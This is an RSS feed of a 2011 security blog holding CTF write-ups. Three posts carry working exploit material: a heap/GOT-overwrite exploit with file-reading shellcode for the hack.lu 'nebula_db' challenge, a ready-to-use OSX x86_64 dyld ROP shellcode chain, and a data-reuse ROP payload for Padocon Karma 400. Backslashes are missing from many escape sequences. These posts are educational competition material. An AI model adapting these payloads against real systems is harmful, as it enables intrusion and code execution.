<?xml version="1.0" encoding="UTF-8" ?>

<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
   
   	<title>RealJenius.com - Tag: 2011</title>
   
   <link>http://realjenius.com</link>
   <description>I'm a software developer in the game industry, and have been (for better or worse) coding on the Java platform for the last decade. I also do all my own stunts.</description>
   <language>en-us</language>
   <managingEditor>R.J. Lorimer</managingEditor>
   <atom:link href="rss" rel="self" type="application/rss+xml" />
   
	<item>
  <title>#7th at CSAW CTF</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/26/7th-at-csaw-ctf.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-26T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/26/7th-at-csaw-ctf.html</guid>
  <description><![CDATA[
     <p>There are quite a number of CTF games this month. After <a href="http://www.vnsecurity.net/2011/09/4th-at-hack-lu-ctf/">#hacklu</a> last week, some of us have played <a href="https://csawctf.poly.edu/scoreboard.php" target="_blank">CSAW CTF Quals</a> over the weekend. We finished at 7th (solved all the challenges except the 200 points Recon Judge challenge of <a href="http://trailofbits.com/" target="_blank">Dino Dai Zovi</a>).</p>

<p>Congratz to the top 6 teams who solved all the challenges. See you guys at <a href="http://ctf.itsec.rwth-aachen.de/" target="_blank">rwthCTF</a> next week.</p>

<p style="text-align: center">
  <a href="https://csawctf.poly.edu/scoreboard.php"><img class="aligncenter size-full wp-image-1211" title="csawctf_ranking" src="/wp/storage/uploads/2011/09/csawctf_ranking.png" alt="csawctf_ranking" width="480" height="211" /></a>
</p>

<p style="text-align: center">
  <em><span style="color: #888888">P/S: &#8216;Undergraduate&#8217; category was a mistake :P)</span></em>
</p>


  ]]></description>
</item>

	<item>
  <title>hack.lu CTF 2011 nebula DB systems</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/22/hack-lu-ctf-2011-nebula-db-systems.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-22T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/22/hack-lu-ctf-2011-nebula-db-systems.html</guid>
  <description><![CDATA[
     <p>Challenge Summary:</p>

<blockquote>
  <p>While you were investigating the Webserver of Nebula Death Stick Services, we, the Galactic’s Secret Service, put our hands on a SSH account of one of the Nebula Death Stick Services founders. This account directly leads to one of their Death Stick storage clusters. Therefore we instruct you with another mission: this time you will have to break their database systems in order to get higher privileges and find further infos about Nebula Corp. And again, may the force be with you!<br />
User: nebulauser</p>

  <p>Pass: nebulauser</p>

  <p>Host: ctf.hack.lu</p>

  <p>Port: 2008</p>
</blockquote>

<p>After login to ctf.hack.lu server we get 4 files:<br />
-nebula_db<br />
-nebula_db_nosuid<br />
_nebula_db.c<br />
_hint</p>

<p>nebula_db is a file with suid(s) bits, when you execute that you have required permission to read the flag, nebula_db_nosuid is the file for testing and debuging purpose, nebula_db.c is source code of challenge, hint is tell you where is the flag stored.<br />
So basically you need to execute nebula_db and some how try to alter execution flow to do some more thing for you ( read the flag ).<br />
First things is try to spot the vuln by reading source code they provided:</p>

<pre class="brush: cpp; title: ; notranslate" title="">/* Nebula Death Stick Services Database Management System
 * This Software has been written to keep track of our customers and their orders.
 * It is still in developement, but I'm pretty sure it's already stable enough for a safe maintenance.
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

#define DB_SIZE 256

char *db[DB_SIZE];

int edit_entry(char *choice, unsigned int entry)
{
        char edit[256], *ln;
        unsigned int len;

        if (atoi(choice) &gt; entry - 1 || atoi(choice) &lt; 0 || entry == 0)
                return -1;

        len = strlen(db[atoi(choice)]);

        printf("Enter your edit: ");
        fgets(edit, sizeof(edit) - 1, stdin);

        ln = strchr(edit, 'n');

        if (ln != NULL)
                *ln = '&#092;&#048;';

        strncpy(db[atoi(choice)], edit, len);

        return 0;
}

char *insert_new_order(unsigned int entry, char *name, char *amount)
{
        char sname[256], samount[256], *nl, *ptr;(3)
        int ret;

        nl = strchr(name, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        nl = strchr(amount, 'n');

        if (nl != NULL)
                *nl = '&#092;&#048;';

        ret = asprintf(&amp;ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);

        if (ret == 0)
                return NULL;

        return ptr;
}

char *enter_new_order(unsigned int entry)
{
        char name[256], amount[256];

        printf("Enter a Name: ");
        fgets(name, sizeof(name) - 1, stdin);

        printf("Enter amount of Death Sticks: ");
        fgets(amount, sizeof(amount) - 1, stdin);

        if (atoi(amount) &lt;= 0) {
                fprintf(stderr, "Insert a real amount please!n");
                return NULL;
        }

        if (entry &gt; DB_SIZE - 1) {
                fprintf(stderr, "Database already full!n");
                return NULL;
        }

        return insert_new_order(entry, name, amount);

}

int print_database(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                printf("%sn", db[i]);

        return 0;
}

int exit_free(unsigned int entry)
{
        unsigned int i;

        for (i = 0; i &lt; entry; i++)
                free(db[i]);

        return 0;
}

int main(int argc, char **argv)
{
        char choice[256], *ret;
        unsigned int entry = 0, len, i;

        puts(
                "Nebula Database set up!n"
                "Enter your choice of action:n"
                "1 - Insert new ordern"
                "2 - Edit ordern"
                "3 - List ordersn"
                "4 - Exitn"
        );

        while (1) {(4)
                printf("Your choice: ");
                fgets(choice, sizeof(choice) - 1, stdin);
                switch (atoi(choice)) {
                        case 1:
                        ret = enter_new_order(entry);

                        if (ret == NULL) {
                                fprintf(stderr, "Error inserting new order!n");
                                break;
                        }

                        db[entry] = ret;
                        entry++;(2)
                        break;

                        case 2:
                        printf("Enter the ID of your order: ");
                        fgets(choice, sizeof(choice) - 1, stdin);

                        if (edit_entry(choice, entry) == -1)
                                fprintf(stderr, "That entry does not exist!n");

                        break;

                        case 3:
                        print_database(entry);
                        break;

                        case 4:
                        return exit_free(entry);

                        default:
                        fprintf(stderr, "Option does not existn");
                }
        }

        return 0;
}

</pre>

<p>As they said, the challenge is a small db management, it save name and amount of orders in an array up to 256 record. You can add or edit a record.<br />
So the funny part is:</p>

<pre class="brush: cpp; title: ; notranslate" title="">ret = asprintf(&amp;ptr, "ID: %d: Name: %s Amount: %s", entry, name, amount);
   if (ret == 0)
                return NULL;
</pre>

<p>And after reading manpages of asprintf, i figured out there is a problem when using it without fully understand what it returned, so return value indicate how many bytes it printed, and the funny part is when it failed, it will return -1 but programmer is not check for that case, they think when it will return 0 mean it failed.<br />
It mean we can still increase entry value at (2) without create any new record. It basic will lead to double free memory corruption error. So next thing is try to figure out how to force asprintf return -1 ( or force it can’t alloc any memory ). After getting help from rd and xichzo, we found ulimit do the tricks:</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 4
*** glibc detected *** ./n: double free or corruption (out): 0x08049118 ***
Aborted (core dumped)
suto@ubuntu:~$
</pre>

<p>After getting here, i see another way can lead to successful exploitation. When asprintf fail, it will use ptr(3) at a result for main program use to keep track a record, somehow we can make this ptr point to some where we want and edit_entry will take care the rest to write a value we control to that address(since ptr is use without initialized)<br />
But i can’t find anyway to do that, so i thinking another solution.<br />
And i wonder if when the first alloc failt, so it will use the original value of at that address. After some check i’m stuck cause i can’t not do anything without this default value.<br />
I try some google in hopeless :p with keyword: “control uninitialized memory”<br />
At the first resutls is:<br />
<a href="http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html">http://drosenbe.blogspot.com/2010/04/controlling-uninitialized-memory-with.html<br />
</a><br />
Another trick to control memory at the begining of process execution. Let’s check:</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "A"*20000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db
ERROR: ld.so: object '&lt;A&gt;*20000...
 from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Your choice: 1
Enter a Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Enter amount of Death Sticks: 1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
Your choice: 2
Enter the ID of your order: 0
Segmentation fault (core dumped)
suto@ubuntu:~$
</pre>

<p>So if this tricks work, we will have a write to address at 0×41414141.</p>

<pre class="brush: cpp; title: ; notranslate" title="">(gdb) x/i $eip
=&gt; 0xb764b706:  movdqu (%edi),%xmm1
(gdb) i r $edi
edi            0x41414141       1094795585
(gdb) bt
#0  0xb764b706 in ?? () from /lib/i386-linux-gnu/libc.so.6
#1  0x0804864c in edit_entry ()
#2  0x08048a04 in main ()
</pre>

<p>So this is all i want :p Next things is find some where to write, and i choose GOT section, first thing i trying is printf@GOT and using a hardcode address to return, and i stupid try to do that to the end of the game :(.<br />
After that, thinking a little bit, i got another solution:<br />
After the calling edit_entry ( where we can directly write to GOT section), program will return to while loop at (4) and continue execute, then i see a good candidate to overwrite is atoi, why? cause after fgets at (5) eax will point to our string, and we will use call *eax gadget to execute our shellcode.<br />
And finally:</p>

<pre class="brush: bash; title: ; notranslate" title="">export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
</pre>

<p>This will force program wirte to atoi@PLT and</p>

<pre class="brush: bash; title: ; notranslate" title="">suto@ubuntu:~$ objdump -d n | grep call | grep eax
 80485a8:       ff 14 85 08 90 04 08    call   *0x8049008(,%eax,4)
 80485ef:       ff d0                   call   *%eax
 8048b1b:       ff d0                   call   *%eax
suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+"x1bx8bx04x08"*40+"xcc"*400' &gt; input
suto@ubuntu:~$ bash
suto@ubuntu:~$ ulimit -s unlimited
suto@ubuntu:~$ export LD_PRELOAD=`python -c 'print "x18x91x04x08"*4000+"xcc"*1000'`
suto@ubuntu:~$ ulimit -c unlimited
suto@ubuntu:~$  ulimit -v 1795
suto@ubuntu:~$ ./nebula_db &lt; input
ERROR: ld.so: object from LD_PRELOAD cannot be preloaded: ignored.
Nebula Database set up!
Enter your choice of action:
1 - Insert new order
2 - Edit order
3 - List orders
4 - Exit

Trace/breakpoint trap (core dumped)
.......
(gdb) x/20x $eip
0xbfa33571:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33581:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa33591:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335a1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
0xbfa335b1:     0xcccccccc      0xcccccccc      0xcccccccc      0xcccccccc
</pre>

<p>So you can replace xcc with a shellcode to read the flag key file.<br />
Here is my shellcode to read /home/suto/flag and write to /tmp/flag: ( <a href="http://pastebin.com/yWUE40cM">assembly source</a>)</p>

<pre class="brush: cpp; title: ; notranslate" title="">char shellcode[] =
        "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41"
        "xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3"
        "x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1"
        "x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0"
        "xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff"
        "x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67"
        "x41x2fx74x6dx70x2fx66x6cx61x67";

</pre>

<pre class="brush: cpp; title: ; notranslate" title="">suto@ubuntu:~$ python -c 'print "1n"+"A"*250+"n"+"1"*250+"n"+"2n0n"+  "xebx44x5bx31xc0x88x43x0fxb0x05xb9x42x44x41x41       xc1xe1x14xc1xe9x14x66xbaxe4x01xcdx80x50x83xc3
x10x31xc0xb0x05xcdx80x5bx50xb0xc8x29xc4x89xe1
x89xc2x31xc0xb0x03xcdx80xb0xc8x01xc4x5bx31xc0
xb0x04xcdx80x31xc0xb0x01xcdx80xe8xb7xffxffxff
x2fx68x6fx6dx65x2fx73x75x74x6fx2fx66x6cx61x67
x41x2fx74x6dx70x2fx66x6cx61x67";' &gt; input
suto@ubuntu:~$./nebula_db &lt; input
suto@ubuntu:~$cat /tmp/flag
hello
</pre>

<p>Finally,congratz to bobsleigh is the only team solved it.<br />
Thanks fluzfinger team for a great ctf. See u guys in next year!</p>

<p>–suto–</p>


  ]]></description>
</item>

	<item>
  <title>#4th at hack.lu CTF</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/21/4th-at-hack-lu-ctf.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-09-21T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/09/21/4th-at-hack-lu-ctf.html</guid>
  <description><![CDATA[
     <p style="text-align: center">
  Thanks <a href="http://fluxfingers.net/" target="_blank">FluxFingers</a> for the great #CTF at <a href="http://2011.hack.lu/index.php/CaptureTheFlag" target="_blank">hack.lu</a>!!!!
</p>

<p>[<img class="aligncenter size-full wp-image-1174" title="final_score" src="/wp/storage/uploads/2011/09/final_score.png" alt="final_score" width="306" height="352" />][1]</p>

<p style="text-align: -webkit-auto">

 [1]: /wp/storage/uploads/2011/09/final_score.png
</p>

  ]]></description>
</item>

	<item>
  <title>Yet another universal OSX x86_64 dyld ROP shellcode</title>
  <link>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-07-30T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/research/2011/07/30/yet-another-universal-osx-x86_64-dyld-rop-shellcode.html</guid>
  <description><![CDATA[
     <p>This technique was killed by OSX Lion 10.7 with full ASLR. @pa_kt has posted an <a href="http://gdtr.wordpress.com/2011/07/23/universal-rop-shellcode-for-os-x-x64/">Universal ROP shellcode for OS X x64</a> with detail steps and explanation. If you don’t have a chance to read above post, the basic ideas are:</p>

<ul>
  <li>Copy stubcode to a writable area (.data section)</li>
  <li>Make that area RWX</li>
  <li>Jump to RWX area and execute stubcode</li>
  <li>Stubcode will transfer normal shellcode to RWX area and execute it</li>
  <li>All the ROP gadgets are from dyld module which is not randomized</li>
</ul>

<p>In this post, we shows another OSX x86_64 dyld ROP shellcode which is more simple. We employ the same ideas with some minor differences in implementation:</p>

<ul>
  <li>Instead of using long gadgets with “leave”, we use direct, short gadgets from unintended code</li>
  <li>Calling mprotect() via syscall</li>
  <li>Short stubcode (7 bytes) using memcpy() to transfer payload</li>
</ul>

<p>Here is the ROP shellcode with explanation:</p>

<pre class="brush: plain; title: ; notranslate" title=""># store [target], stubcode
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0xc353575e545a5b90 # =&gt; rsi = stubcode
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc74f80 # =&gt; rdi
0x00007fff5fc24d26 # mov [rdi+0x80] rsi; stubcode =&gt; [target]
# load rdx, 0x7 (prot RWX)
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75001 # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1]
0x00007fff5fc219c3 # pop rbp ; add [rax] al ; add cl cl
0x00007fff5fc75000 # =&gt; rbp
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000000007 # =&gt; rsi
0x00007fff5fc14149 # mov edx esi ; add [rax] al ; add [rbp+0x39] cl =&gt; rdx = 0x7
# load rsi, 4096 (size)
0x00007fff5fc0e7ee # pop rsi ; adc al 0x83
0x0000000000001000 # =&gt; rsi = 4096
# load rax, mprotect_syscal
0x00007fff5fc24cdc # pop rdi
0x000000000200004b # =&gt; rdi
0x00007fff5fc1ddc0 # lea rax, [rdi-0x1] =&gt; rax = 0x200004a (mprotect syscall)
# load rdi, target
0x00007fff5fc24cdc # pop rdi
0x00007fff5fc75000 # =&gt; rdi = target
# syscall
0x00007fff5fc1c76d # mov r10, rcx; syscall  =&gt; mprotect(target, 4096, 7)
0x00007fff5fc75000 # jump to target, execute stubcode
# stubcode
# 5B                pop rbx     # rbx -&gt; memcpy()
# 5A                pop rdx     # rdx -&gt; size
# 54                push rsp    # src -&gt; &amp;shellcode
# 5E                pop rsi     # src -&gt; &amp;shellcode
# 57                push rdi    # jump to target when return from memcpy()
# 53                push rbx    # memcpy()
# C3                ret         # execute memcpy(target, &amp;shellcode, size)
0x00007fff5fc234f0 # &amp;memcpy()
0x0000000000000200 # shellcode size = 512
&lt;your shellcode here&gt;
</pre>

<p>You can verify those gadgets and find more here: <a href="http://goo.gl/p35vY">http://goo.gl/p35vY</a></p>

<p>Ready to use shellcode:</p>

<pre class="brush: plain; title: ; notranslate" title="">"xeexe7xc0x5fxffx7fx00x00x90x5bx5ax54x5ex57x53xc3"
"xdcx4cxc2x5fxffx7fx00x00x80x4fxc7x5fxffx7fx00x00"
"x26x4dxc2x5fxffx7fx00x00xdcx4cxc2x5fxffx7fx00x00"
"x01x50xc7x5fxffx7fx00x00xc0xddxc1x5fxffx7fx00x00"
"xc3x19xc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xeexe7xc0x5fxffx7fx00x00x07x00x00x00x00x00x00x00"
"x49x41xc1x5fxffx7fx00x00xeexe7xc0x5fxffx7fx00x00"
"x00x10x00x00x00x00x00x00xdcx4cxc2x5fxffx7fx00x00"
"x4bx00x00x02x00x00x00x00xc0xddxc1x5fxffx7fx00x00"
"xdcx4cxc2x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"x6dxc7xc1x5fxffx7fx00x00x00x50xc7x5fxffx7fx00x00"
"xf0x34xc2x5fxffx7fx00x00x00x02x00x00x00x00x00x00"
</pre>

  ]]></description>
</item>

	<item>
  <title>DEFCON 19 CTF Quals: writeups collection</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/05/31/defcon-19-ctf-quals-writeups-collection.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-05-31T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/05/31/defcon-19-ctf-quals-writeups-collection.html</guid>
  <description><![CDATA[
     <ul>
  <li>Compilation by Rogunix: <a href="http://rogunix.com/ctf/defconquals19.html">http://rogunix.com/ctf/defconquals19.html</a></li>
  <li><a href="http://ddtek.biz/2011-quals-results.tar.lzma">Raw results</a></li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Padocon 2011 CTF Karma 400 exploit: the data re-use way</title>
  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2011/01/31/padocon-2011-ctf-karma-400-exploit-the-data-re-use-way.html</link>
  <author>R.J. Lorimer</author>
  <pubDate>2011-01-31T00:00:00+08:00</pubDate>
  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2011/01/31/padocon-2011-ctf-karma-400-exploit-the-data-re-use-way.html</guid>
  <description><![CDATA[
     <p>Karma 400 at Padocon 2011 Online CTF is a fun challenge. The binary was provided without source code, you can reach its decompiled source at <a href="http://disekt.tk/node/39" target="_blank">disekt’s team writeup</a>. In that writeup, the solution was bruteforcing address of IO stdin buffer with return to do_system() trick. Karma 400 is different than other karma attackme:</p>

<ul>
  <li>It runs as a network daemon (via xinetd): so you cannot abuse its arguments and environments</li>
  <li>Input buffer is 200 bytes: you have room for payload (not only just overwrite saved EIP)</li>
  <li>There is a 10 seconds sleep before main() returns: this makes bruteforcing less effective</li>
</ul>

<p>In this post I will show how to exploit karma 400 with <a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">data re-use method</a>.</p>

<pre class="brush: plain; title: ; notranslate" title="">$ gdb -q karma400_lolcosmostic
gdb$ pattern_create 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
gdb$ r
input: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
--------------------------------------------------------------------------[regs]
 EAX: 0x00000000  EBX: 0x41346141  ECX: 0xBFFFF384  EDX: 0x00B84FF4  o d I t S z a p c
 ESI: 0x00000000  EDI: 0x61413561  EBP: 0x62413961  ESP: 0xBFFFF3DC  EIP: 0x08048793
 CS: 0073  DS: 007B  ES: 007B  FS: 0000  GS: 0033  SS: 007B
[0x007B:0xBFFFF3DC]------------------------------------------------------[stack]
0xBFFFF42C : 64 37 41 64 38 41 64 39 - 41 65 30 41 65 31 41 65 d7Ad8Ad9Ae0Ae1Ae
0xBFFFF41C : 41 64 32 41 64 33 41 64 - 34 41 64 35 41 64 36 41 Ad2Ad3Ad4Ad5Ad6A
0xBFFFF40C : 36 41 63 37 41 63 38 41 - 63 39 41 64 30 41 64 31 6Ac7Ac8Ac9Ad0Ad1
0xBFFFF3FC : 63 31 41 63 32 41 63 33 - 41 63 34 41 63 35 41 63 c1Ac2Ac3Ac4Ac5Ac
0xBFFFF3EC : 41 62 36 41 62 37 41 62 - 38 41 62 39 41 63 30 41 Ab6Ab7Ab8Ab9Ac0A
0xBFFFF3DC : 30 41 62 31 41 62 32 41 - 62 33 41 62 34 41 62 35 0Ab1Ab2Ab3Ab4Ab5
--------------------------------------------------------------------------1
=&gt; 0x8048793:    ret
 0x8048794:    nop
 0x8048795:    nop
 0x8048796:    nop
--------------------------------------------------------------------------------
0x08048793 in ?? ()
gdb$ x/x $esp
0xbffff3dc:    0x31624130

gdb$ pattern_offset 200 0x31624130
Searching for 0Ab1 in buf size 200
32
</pre>

<p>We have 200-32 = 168 bytes left for our payload. The goal is to execute a custom shell in /tmp, for this purpose I choose execv(“/tmp/v”, ptr_to_NULL).</p>

<p><strong>Step 1:</strong> transfer the string “/tmp/v” to un-used data region using chained strcpy() calls</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ x/32wx 0x08049a50
0x8049a50:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049a60 &lt;stdin&gt;:    0x00b85440    0x00000000    0x00000000    0x00000000
0x8049a70:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049a80 &lt;stdout&gt;:    0x00b854e0    0x00000000    0x00000000    0x00000000
0x8049a90:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049aa0:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049ab0:    0x00000000    0x00000000    0x00000000    0x00000000
0x8049ac0:    0x00000000    0x00000000    0x00000000    0x00000000

TARGET = 0x8049a90
NULLARGV = TARGET - 4

gdb$ info func strcpy@plt
All functions matching regular expression "strcpy@plt":

Non-debugging symbols:
0x080484f0  strcpy@plt

STRCPY = 0x080484f0

gdb$ x/4i 0x80485e3
 0x80485e3:    pop    ebx
 0x80485e4:    pop    ebp
 0x80485e5:    ret
 0x80485e6:    lea    esi,[esi+0x0]
gdb$

POP2RET = 0x80485e3

gdb$ findsubstr 0x08048000 0x08049000 "/tmp/v\x00"
Searching for '/tmp/vx00'
'/': 0x8048134
't': 0x80480f6
'm': 0x80482dc
'p': 0x8048313
'/': 0x8048134
'vx00': 0x80485e7

DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048134, 0x80485e7]
</pre>

<p>The payload will look like:<br />
[ STRCPY, POP2RET, TARGET, DATA1[0],  STRCPY, POP2RET, TARGET+1, DATA1<a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">1</a>, … ]</p>

<p><strong>Step-2:</strong> overwrite GOT entry of puts() (or any function) with execv()<br />
This is a bit tricky, because libc address is ASCII ARMOR we cannot put execv() address directly on the payload. Fortunately, libc address is not randomized so we can directly overwrite GOT with execv() address using strcpy likes the data above.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ p execv
$2 = {&lt;text variable, no debug info&gt;} 0xac4680 &lt;execv&gt;

EXECV = 0xac4680
gdb$ info functions puts@plt
All functions matching regular expression "puts@plt":

Non-debugging symbols:
0x08048540  puts@plt
gdb$ x/i 0x08048540
 0x8048540 &lt;puts@plt&gt;:    jmp    DWORD PTR ds:0x8049a48

PLTADDR = 0x08048540
GOTADDR = 0x8049a48

gdb$ findsubstr 0x08048000 0x08049000  0xac4680
Searching for 'x80Fxac'
'x80': 0x804803d
'F': 0x8048003
'xac': 0x80481b0

gdb$ findsubstr 0x08048000 0x08049000  0x00
Searching for 'x00'
'x00': 0x8048007

DATA2 = [0x804803d, 0x8048003, 0x80481b0, 0x8048007]
</pre>

<p>The payload will look like:<br />
[ STRCPY, POP2RET, GOTADDR, DATA2[0], STRCPY, POP2RET, GOTADDR+1, DATA2<a href="http://force.vnsecurity.net/download/longld/BHUS10_Paper_Payload_already_inside_data_reuse_for_ROP_exploits.pdf">1</a>, … ]</p>

<p>Finally, we make call to execv() via puts@plt:<br />
[ PLTADDR, 0xdeadbeef, TARGET, NULLARGV ]</p>

<p>We have a small problem, our payload size is 176. Each strcpy() call takes 16 bytes payload and there is 10 calls for data transfer, we have to reduce at least 1 call. We can tweak our custom shell a bit to reduce payload length, instead of “/tmp/v” we use “/tmp/ld-linux.so.2” so the last string to copy is “/ld-linux.so.2”.</p>

<pre class="brush: plain; title: ; notranslate" title="">gdb$ findsubstr 0x08048000 0x0804a000  "/"
Searching for '/'
'/': 0x8048134
gdb$ x/s 0x8048134
0x8048134:     "/lib/ld-linux.so.2"
gdb$ x/s 0x8048138
0x8048138:     "/ld-linux.so.2"

DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048138]
</pre>

<p>Wrap things up and test:</p>

<pre class="brush: python; title: ; notranslate" title="">gdb$ shell python
Python 2.6.6 (r266:84292, Sep 15 2010, 15:52:39)
[GCC 4.4.5] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; TARGET = 0x8049a90
&gt;&gt;&gt; NULLARGV = TARGET - 4
&gt;&gt;&gt; STRCPY = 0x080484f0
&gt;&gt;&gt; POP2RET = 0x80485e3
&gt;&gt;&gt; DATA1 = [0x8048134, 0x80480f6, 0x80482dc, 0x8048313, 0x8048138]
&gt;&gt;&gt; PAYLOAD = []
&gt;&gt;&gt; for i in range(len(DATA1)):
...     PAYLOAD += [STRCPY, POP2RET, TARGET+i, DATA1[i]]
...
&gt;&gt;&gt; for i in range(len(DATA2)):
...     PAYLOAD += [STRCPY, POP2RET, GOTADDR+i, DATA2[i]]
...
&gt;&gt;&gt; PAYLOAD += [PLTADDR, 0xdeadbeef, TARGET, NULLARGV]
&gt;&gt;&gt; len(PAYLOAD)
40
&gt;&gt;&gt; fd = open("payload", "wb")
&gt;&gt;&gt; import struct
&gt;&gt;&gt; fd.write("A"*32) # padding
&gt;&gt;&gt; for i in range(len(PAYLOAD)):
...     fd.write(struct.pack("&lt;I", PAYLOAD[i]))
...
&gt;&gt;&gt; fd.close()
&gt;&gt;&gt; ^D

gdb$ shell ln -s /usr/bin/id /tmp/ld-linux.so.2
gdb$ r &lt; payload
input: process 1866 is executing new program: /usr/bin/id

Program received signal SIGPIPE, Broken pipe.
</pre>

<p>Pwned!</p>

<p><em>Notes</em>:</p>

<ul>
  <li>This way can also be applied to exploit karma 500</li>
  <li>Disekt’s return to do_system() trick is really neat for local exploit</li>
</ul>


  ]]></description>
</item>

	<item>
  <title>Mật mã hiện đại (1)</title>
  <link>http://realjenius.com/research/2011/01/14/crypto-1.html</link>
